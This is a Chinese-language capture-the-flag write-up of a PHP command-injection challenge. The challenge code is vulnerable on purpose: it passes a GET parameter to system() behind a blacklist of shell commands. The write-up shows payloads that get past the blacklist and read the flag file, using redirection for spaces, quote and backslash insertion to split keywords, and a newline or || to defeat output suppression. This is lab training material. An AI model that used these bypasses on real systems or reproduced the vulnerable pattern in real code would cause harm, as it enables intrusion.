```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了

;

cat

flag

空格

数字

$
*

more

less

head

sort

tail

sed

cut

awk

strings

od

curl

`

%



无回显





### 第一种

利用<>绕过空格

利用''绕过字母

利用%0a绕过无回显

```
?c=ls||
```

![image-20250403154607498](./assets/image-20250403154607498.png)

```
?c=tac<>fl''ag.php%0a
```

![image-20250403154636520](./assets/image-20250403154636520.png)





### 第二种

利用<绕过空格

利用\绕过字母

利用||绕过无回显

```
?c=tac<fl\ag.php||
```

![image-20250403154726679](./assets/image-20250403154726679.png)